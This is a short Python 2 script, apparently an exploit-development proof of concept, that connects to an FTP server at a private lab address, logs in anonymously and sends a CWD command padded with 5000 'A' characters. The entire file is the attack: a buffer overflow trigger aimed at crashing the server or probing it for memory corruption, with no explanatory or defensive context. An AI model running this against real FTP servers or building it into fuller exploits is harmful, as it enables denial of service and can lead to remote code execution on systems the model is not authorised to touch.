#!/usr/bin/env python

import socket
import sys

TCP_IP   = '192.168.80.151'
TCP_PORT = 21

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
except:
    print "socket() failed"
    sys.exit(1)

s.connect((TCP_IP, TCP_PORT))
print s.recv(1024),

s.send("USER anonymous\n")
print s.recv(1024),

s.send("PASS anonymous\n")
print s.recv(1024),

s.send("CWD " + "\x41" * 5000)
print s.recv(1024),

s.close()
